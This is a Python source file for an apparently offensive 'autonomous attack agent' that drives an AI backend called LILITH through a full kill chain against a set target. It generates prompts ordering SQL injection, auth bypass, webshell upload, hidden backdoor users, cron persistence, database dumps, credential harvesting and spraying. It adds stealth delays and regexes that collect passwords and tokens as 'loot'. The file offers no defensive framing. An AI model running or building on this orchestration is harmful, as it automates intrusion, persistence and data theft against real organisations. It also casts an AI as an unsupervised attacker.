#!/usr/bin/env python3
"""
LuciferOS Autonomous Attack Agent
Full agentic loop - thinks, plans, executes, learns
"""

import threading
import queue
import time
import json
import requests
from typing import Dict, List, Optional, Callable, Any
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum

# Import our modules
try:
    from attack_memory import get_memory, AttackMemory
    from stealth_engine import get_stealth, StealthEngine, LOTLArsenal
except ImportError:
    import sys
    sys.path.insert(0, '.')
    from attack_memory import get_memory, AttackMemory
    from stealth_engine import get_stealth, StealthEngine, LOTLArsenal


class AttackPhase(Enum):
    RECON = "recon"
    SCAN = "scan"
    EXPLOIT = "exploit"
    PERSIST = "persist"
    EXFIL = "exfil"
    PIVOT = "pivot"
    CLEANUP = "cleanup"


class VictoryCondition(Enum):
    ADMIN_ACCESS = "admin_access"
    RCE = "rce"
    CREDENTIAL_CAPTURE = "credential_capture"
    DATA_EXFIL = "data_exfil"
    PERSISTENCE = "persistence"
    DOMAIN_ADMIN = "domain_admin"
    DATABASE_ACCESS = "database_access"
    FILE_READ = "file_read"


@dataclass
class AttackTask:
    """A single attack task to execute"""
    id: str
    phase: AttackPhase
    action: str
    target: str
    payload: Optional[str] = None
    priority: int = 5  # 1-10, higher = more important
    dependencies: List[str] = field(default_factory=list)
    timeout: int = 60
    retries: int = 2
    
    def __hash__(self):
        return hash(self.id)


@dataclass
class AttackResult:
    """Result of an attack task"""
    task_id: str
    success: bool
    data: Any = None
    error: str = None
    execution_time: float = 0.0
    victory: Optional[VictoryCondition] = None
    loot: List[Dict] = field(default_factory=list)
    next_tasks: List[AttackTask] = field(default_factory=list)


class VictoryDetector:
    """Detect when we've achieved attack objectives"""
    
    VICTORY_PATTERNS = {
        VictoryCondition.ADMIN_ACCESS: [
            r'admin',
            r'administrator',
            r'root',
            r'sudo',
            r'superuser',
        ],
        VictoryCondition.RCE: [
            r'uid=\d+',
            r'whoami',
            r'hostname',
            r'uname -a',
            r'systeminfo',
            r'COMPUTERNAME',
        ],
        VictoryCondition.DATABASE_ACCESS: [
            r'mysql>',
            r'postgres',
            r'SQL Server',
            r'sqlite>',
            r'mongodb',
            r'SELECT.*FROM',
        ],
        VictoryCondition.FILE_READ: [
            r'root:.*:0:0',  # /etc/passwd
            r'\[boot loader\]',  # boot.ini
            r'HKEY_',  # registry
            r'-----BEGIN.*PRIVATE KEY-----',
        ],
        VictoryCondition.CREDENTIAL_CAPTURE: [
            r'password["\s]*[:=]',
            r'api[_-]?key',
            r'token["\s]*[:=]',
            r'secret["\s]*[:=]',
            r'Authorization:\s*Bearer',
        ],
    }
    
    @classmethod
    def check(cls, response: str, context: Dict = None) -> List[VictoryCondition]:
        """Check response for victory conditions"""
        import re
        victories = []
        
        response_lower = response.lower() if response else ""
        
        for condition, patterns in cls.VICTORY_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    victories.append(condition)
                    break
        
        # Context-based detection
        if context:
            status_code = context.get('status_code')
            url = context.get('url', '')
            
            # Admin panel access
            if status_code == 200 and any(p in url for p in ['/admin', '/dashboard', '/panel', '/wp-admin']):
                if 'login' not in response_lower and 'sign in' not in response_lower:
                    victories.append(VictoryCondition.ADMIN_ACCESS)
        
        return list(set(victories))


class ParallelAttackExecutor:
    """Execute multiple attacks in parallel"""
    
    def __init__(self, max_workers: int = 5, stealth_mode: str = "normal"):
        self.max_workers = max_workers
        self.stealth = get_stealth(stealth_mode)
        self.memory = get_memory()
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.results_queue = queue.Queue()
        self.active_tasks: Dict[str, AttackTask] = {}
        self.completed_tasks: Dict[str, AttackResult] = {}
        self.lock = threading.Lock()
        
    def submit(self, task: AttackTask, execute_func: Callable) -> str:
        """Submit a task for execution"""
        with self.lock:
            self.active_tasks[task.id] = task
        
        future = self.executor.submit(self._execute_with_stealth, task, execute_func)
        future.add_done_callback(lambda f: self._on_complete(task.id, f))
        
        return task.id
    
    def _execute_with_stealth(self, task: AttackTask, execute_func: Callable) -> AttackResult:
        """Execute task with stealth measures"""
        start_time = time.time()
        
        try:
            # Stealth delay
            self.stealth.wait()
            
            # Check if we should take a break
            if self.stealth.should_pause():
                self.stealth.take_break()
            
            # Execute the attack
            result = execute_func(task)
            
            # Record in memory
            self.memory.record_attack(
                target_fingerprint=task.target[:16] if task.target else "unknown",
                attack_type=task.phase.value,
                attack_vector=task.action,
                payload=task.payload or "",
                success=result.success,
                impact_score=10.0 if result.victory else (5.0 if result.success else 0.0),
                execution_time=time.time() - start_time
            )
            
            # Store any loot
            for loot in result.loot:
                self.memory.store_loot(
                    target_fingerprint=task.target[:16] if task.target else "unknown",
                    loot_type=loot.get('type', 'unknown'),
                    data=loot.get('data'),
                    source=task.action
                )
            
            result.execution_time = time.time() - start_time
            return result
            
        except Exception as e:
            return AttackResult(
                task_id=task.id,
                success=False,
                error=str(e),
                execution_time=time.time() - start_time
            )
    
    def _on_complete(self, task_id: str, future):
        """Handle task completion"""
        try:
            result = future.result()
        except Exception as e:
            result = AttackResult(task_id=task_id, success=False, error=str(e))
        
        with self.lock:
            self.completed_tasks[task_id] = result
            if task_id in self.active_tasks:
                del self.active_tasks[task_id]
        
        self.results_queue.put(result)
    
    def get_results(self, timeout: float = 0.1) -> List[AttackResult]:
        """Get completed results"""
        results = []
        while True:
            try:
                result = self.results_queue.get(timeout=timeout)
                results.append(result)
            except queue.Empty:
                break
        return results
    
    def wait_all(self, timeout: float = 300) -> List[AttackResult]:
        """Wait for all tasks to complete"""
        start = time.time()
        while time.time() - start < timeout:
            with self.lock:
                if not self.active_tasks:
                    break
            time.sleep(0.5)
        
        return list(self.completed_tasks.values())
    
    def shutdown(self):
        """Shutdown the executor"""
        self.executor.shutdown(wait=False)


class AutonomousAgent:
    """
    LILITH's brain - autonomous attack planning and execution
    """
    
    def __init__(self, backend_url: str = "http://127.0.0.1:5000",
                 stealth_mode: str = "normal", max_parallel: int = 5):
        self.backend_url = backend_url
        self.memory = get_memory()
        self.stealth = get_stealth(stealth_mode)
        self.executor = ParallelAttackExecutor(max_parallel, stealth_mode)
        
        self.target = None
        self.target_fingerprint = None
        self.current_phase = AttackPhase.RECON
        self.victories: List[VictoryCondition] = []
        self.task_queue: List[AttackTask] = []
        self.running = False
        self.callbacks: Dict[str, Callable] = {}
        
        # Attack chain templates
        self.attack_chains = {
            'web_full': [
                AttackPhase.RECON,
                AttackPhase.SCAN,
                AttackPhase.EXPLOIT,
                AttackPhase.PERSIST,
                AttackPhase.EXFIL,
            ],
            'quick_pwn': [
                AttackPhase.SCAN,
                AttackPhase.EXPLOIT,
            ],
            'stealth': [
                AttackPhase.RECON,
                AttackPhase.EXPLOIT,
                AttackPhase.EXFIL,
            ],
        }
    
    def set_target(self, target: str, technologies: List[str] = None,
                  cms: str = None, ports: List[int] = None):
        """Set the attack target"""
        self.target = target
        self.target_fingerprint = self.memory.remember_target(
            domain=target,
            technologies=technologies,
            cms=cms,
            ports=ports
        )
        
        # Check if we've attacked similar targets
        suggestion = self.memory.suggest_attack(
            domain=target, cms=cms, technologies=technologies
        )
        
        return suggestion
    
    def on(self, event: str, callback: Callable):
        """Register event callback"""
        self.callbacks[event] = callback
    
    def _emit(self, event: str, data: Any):
        """Emit event to callbacks"""
        if event in self.callbacks:
            try:
                self.callbacks[event](data)
            except Exception as e:
                print(f"Callback error: {e}")
    
    def query_lilith(self, prompt: str) -> str:
        """Query LILITH AI for attack guidance"""
        try:
            response = requests.post(
                f"{self.backend_url}/query",
                json={'prompt': prompt},
                timeout=60
            )
            if response.ok:
                return response.json().get('response', '')
        except Exception as e:
            return f"Error querying LILITH: {e}"
        return ""
    
    def plan_attack(self, chain_type: str = 'web_full') -> List[AttackTask]:
        """Plan attack tasks based on target and chain type"""
        if not self.target:
            return []
        
        tasks = []
        task_id = 0
        
        chain = self.attack_chains.get(chain_type, self.attack_chains['web_full'])
        
        for phase in chain:
            phase_tasks = self._generate_phase_tasks(phase, task_id)
            tasks.extend(phase_tasks)
            task_id += len(phase_tasks)
        
        self.task_queue = tasks
        return tasks
    
    def _generate_phase_tasks(self, phase: AttackPhase, start_id: int) -> List[AttackTask]:
        """Generate tasks for a specific phase"""
        tasks = []
        
        if phase == AttackPhase.RECON:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "subdomain_enum", self.target, priority=8),
                AttackTask(f"task_{start_id+1}", phase, "tech_detect", self.target, priority=9),
                AttackTask(f"task_{start_id+2}", phase, "whois_lookup", self.target, priority=5),
                AttackTask(f"task_{start_id+3}", phase, "dns_enum", self.target, priority=7),
            ]
        
        elif phase == AttackPhase.SCAN:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "port_scan", self.target, priority=9),
                AttackTask(f"task_{start_id+1}", phase, "dir_bruteforce", self.target, priority=8),
                AttackTask(f"task_{start_id+2}", phase, "vuln_scan", self.target, priority=10),
                AttackTask(f"task_{start_id+3}", phase, "waf_detect", self.target, priority=6),
            ]
        
        elif phase == AttackPhase.EXPLOIT:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "sqli_test", self.target, priority=10),
                AttackTask(f"task_{start_id+1}", phase, "xss_test", self.target, priority=7),
                AttackTask(f"task_{start_id+2}", phase, "auth_bypass", self.target, priority=9),
                AttackTask(f"task_{start_id+3}", phase, "upload_test", self.target, priority=8),
                AttackTask(f"task_{start_id+4}", phase, "ssrf_test", self.target, priority=7),
                AttackTask(f"task_{start_id+5}", phase, "lfi_test", self.target, priority=8),
            ]
        
        elif phase == AttackPhase.PERSIST:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "webshell_deploy", self.target, priority=9),
                AttackTask(f"task_{start_id+1}", phase, "backdoor_user", self.target, priority=8),
                AttackTask(f"task_{start_id+2}", phase, "cron_persist", self.target, priority=7),
            ]
        
        elif phase == AttackPhase.EXFIL:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "db_dump", self.target, priority=10),
                AttackTask(f"task_{start_id+1}", phase, "file_harvest", self.target, priority=8),
                AttackTask(f"task_{start_id+2}", phase, "cred_harvest", self.target, priority=9),
            ]
        
        elif phase == AttackPhase.PIVOT:
            tasks = [
                AttackTask(f"task_{start_id}", phase, "network_scan", self.target, priority=8),
                AttackTask(f"task_{start_id+1}", phase, "cred_spray", self.target, priority=9),
            ]
        
        return tasks
    
    def execute_task(self, task: AttackTask) -> AttackResult:
        """Execute a single attack task"""
        self._emit('task_start', task)
        
        # Build prompt for LILITH
        prompt = self._build_attack_prompt(task)
        
        # Query LILITH for attack execution
        response = self.query_lilith(prompt)
        
        # Check for victories
        victories = VictoryDetector.check(response, {'url': self.target})
        
        # Parse loot from response
        loot = self._extract_loot(response, task)
        
        result = AttackResult(
            task_id=task.id,
            success=bool(response) and 'error' not in response.lower(),
            data=response,
            victory=victories[0] if victories else None,
            loot=loot
        )
        
        if victories:
            self.victories.extend(victories)
            self._emit('victory', {'condition': victories, 'task': task})
        
        self._emit('task_complete', result)
        return result
    
    def _build_attack_prompt(self, task: AttackTask) -> str:
        """Build LILITH prompt for attack task"""
        prompts = {
            'subdomain_enum': f"Enumerate subdomains for {self.target}. Use subfinder, amass, or similar. List all found subdomains.",
            'tech_detect': f"Detect technologies used by {self.target}. Identify CMS, frameworks, server software, versions.",
            'whois_lookup': f"Perform WHOIS lookup on {self.target}. Extract registrar, nameservers, contact info.",
            'dns_enum': f"Enumerate DNS records for {self.target}. Get A, AAAA, MX, TXT, NS, CNAME records.",
            'port_scan': f"Scan ports on {self.target}. Identify open ports and services. Use nmap or similar.",
            'dir_bruteforce': f"Bruteforce directories on {self.target}. Find hidden endpoints, admin panels, backup files.",
            'vuln_scan': f"Scan {self.target} for vulnerabilities. Check CVEs, misconfigurations, known exploits.",
            'waf_detect': f"Detect WAF/firewall protecting {self.target}. Identify bypass techniques if present.",
            'sqli_test': f"Test {self.target} for SQL injection vulnerabilities. Try all parameters, bypass filters.",
            'xss_test': f"Test {self.target} for XSS vulnerabilities. Try reflected, stored, DOM-based.",
            'auth_bypass': f"Attempt authentication bypass on {self.target}. Try default creds, SQLi login, JWT attacks.",
            'upload_test': f"Test file upload functionality on {self.target}. Try webshell upload, bypass filters.",
            'ssrf_test': f"Test {self.target} for SSRF vulnerabilities. Try internal network access.",
            'lfi_test': f"Test {self.target} for LFI/RFI. Try /etc/passwd, windows paths, wrappers.",
            'webshell_deploy': f"Deploy webshell on {self.target}. Establish persistence.",
            'backdoor_user': f"Create backdoor user on {self.target}. Hide from admin view.",
            'cron_persist': f"Set up cron/scheduled task persistence on {self.target}.",
            'db_dump': f"Dump database from {self.target}. Extract all tables, credentials.",
            'file_harvest': f"Harvest sensitive files from {self.target}. Config files, backups, keys.",
            'cred_harvest': f"Harvest credentials from {self.target}. Passwords, tokens, API keys.",
            'network_scan': f"Scan internal network from {self.target}. Find other targets to pivot.",
            'cred_spray': f"Spray captured credentials against other services. Test reuse.",
        }
        
        base_prompt = prompts.get(task.action, f"Execute {task.action} against {self.target}")
        
        # Add context from memory
        failed = self.memory.get_failed_attacks(self.target_fingerprint)
        if failed:
            failed_actions = [f['attack_vector'] for f in failed[:5]]
            base_prompt += f"\n\nNote: These approaches have failed before: {', '.join(failed_actions)}. Try different techniques."
        
        working = self.memory.get_working_attacks(attack_type=task.phase.value)
        if working:
            base_prompt += f"\n\nPreviously successful technique: {working[0].get('attack_vector')} with payload: {working[0].get('payload', 'N/A')[:100]}"
        
        return base_prompt
    
    def _extract_loot(self, response: str, task: AttackTask) -> List[Dict]:
        """Extract loot from attack response"""
        import re
        loot = []
        
        # Extract credentials
        cred_patterns = [
            r'username["\s:=]+([^\s"\']+)',
            r'password["\s:=]+([^\s"\']+)',
            r'api[_-]?key["\s:=]+([^\s"\']+)',
            r'token["\s:=]+([^\s"\']+)',
        ]
        
        for pattern in cred_patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            for match in matches:
                if len(match) > 3:
                    loot.append({'type': 'credential', 'data': match})
        
        # Extract IPs
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, response)
        for ip in set(ips):
            if not ip.startswith('127.') and not ip.startswith('0.'):
                loot.append({'type': 'ip', 'data': ip})
        
        # Extract URLs
        url_pattern = r'https?://[^\s<>"\']+' 
        urls = re.findall(url_pattern, response)
        for url in set(urls):
            loot.append({'type': 'url', 'data': url})
        
        return loot
    
    def run_full_chain(self, chain_type: str = 'web_full', 
                       stop_on_victory: bool = False,
                       callback: Callable = None):
        """Run full attack chain autonomously"""
        self.running = True
        self.victories = []
        
        # Plan the attack
        tasks = self.plan_attack(chain_type)
        
        self._emit('chain_start', {'tasks': len(tasks), 'chain': chain_type})
        
        current_phase = None
        for task in tasks:
            if not self.running:
                break
            
            # Phase transition
            if task.phase != current_phase:
                current_phase = task.phase
                self._emit('phase_change', current_phase)
            
            # Execute task
            result = self.executor.submit(task, self.execute_task)
            
            # Brief wait between task submissions
            time.sleep(0.1)
        
        # Wait for all tasks
        results = self.executor.wait_all()
        
        # Generate summary
        summary = self._generate_summary(results)
        self._emit('chain_complete', summary)
        
        self.running = False
        return summary
    
    def _generate_summary(self, results: List[AttackResult]) -> Dict:
        """Generate attack summary"""
        successful = [r for r in results if r.success]
        victories = [r.victory for r in results if r.victory]
        all_loot = []
        for r in results:
            all_loot.extend(r.loot)
        
        return {
            'total_tasks': len(results),
            'successful': len(successful),
            'failed': len(results) - len(successful),
            'victories': victories,
            'loot_count': len(all_loot),
            'loot': all_loot,
            'success_rate': len(successful) / len(results) if results else 0,
            'total_time': sum(r.execution_time for r in results),
        }
    
    def stop(self):
        """Stop the attack chain"""
        self.running = False
        self.executor.shutdown()
    
    def get_stats(self) -> Dict:
        """Get current attack statistics"""
        return {
            'target': self.target,
            'current_phase': self.current_phase.value,
            'victories': [v.value for v in self.victories],
            'memory_stats': self.memory.get_stats(),
        }


# Singleton
_agent = None

def get_agent(backend_url: str = "http://127.0.0.1:5000") -> AutonomousAgent:
    """Get the global autonomous agent"""
    global _agent
    if _agent is None:
        _agent = AutonomousAgent(backend_url)
    return _agent


if __name__ == "__main__":
    # Test the autonomous agent
    agent = AutonomousAgent()
    
    # Set callbacks
    agent.on('task_start', lambda t: print(f"Starting: {t.action}"))
    agent.on('task_complete', lambda r: print(f"Complete: {r.task_id} - {'✓' if r.success else '✗'}"))
    agent.on('victory', lambda v: print(f"🏆 VICTORY: {v['condition']}"))
    agent.on('phase_change', lambda p: print(f"\n=== Phase: {p.value.upper()} ==="))
    
    # Set target
    suggestion = agent.set_target("example.com")
    print(f"Suggestion: {suggestion}")
    
    # Plan attack
    tasks = agent.plan_attack('quick_pwn')
    print(f"Planned {len(tasks)} tasks")
    
    for task in tasks:
        print(f"  [{task.phase.value}] {task.action} (priority: {task.priority})")
